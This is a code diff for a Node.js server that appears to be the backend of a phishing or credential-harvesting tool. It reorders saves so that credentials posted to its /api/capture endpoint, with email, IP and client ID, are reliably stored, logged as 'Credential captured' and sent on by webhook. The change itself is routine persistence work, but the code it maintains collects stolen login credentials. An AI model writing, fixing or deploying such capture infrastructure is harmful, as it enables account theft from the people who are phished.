@@ -129,6 +129,8 @@ function saveStore() {
 }
 
 function forceSave() {
+    // Cancel any pending debounced save — forceSave is the authoritative write
+    if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
     if (USE_REDIS && redis) {
         return redis.set(REDIS_KEY, JSON.stringify(store)).catch(() => {});
     } else {
@@ -705,10 +707,10 @@ app.post('/api/capture', async (req, res) => {
     };
     store.credentials.unshift(entry);
     if (store.credentials.length > 1000) store.credentials.length = 1000;
-    // Use forceSave (immediate write) instead of debounced saveStore
-    // so Vercel serverless doesn't freeze before the timer fires
-    await forceSave();
+    // Add event first (synchronously modifies store.events) then save everything
+    // in one forceSave() so Vercel can't freeze the instance between writes
     addEvent('credential_captured', { clientId: entry.clientId, email: entry.email, source: entry.source, ip: entry.ip });
+    await forceSave();
     console.log(`\u{1F511} Credential captured: ${entry.email} from ${entry.clientId} (${entry.ip})`);
     // Fire webhook notification
     if (store.config?.webhookOnCredential !== false) {
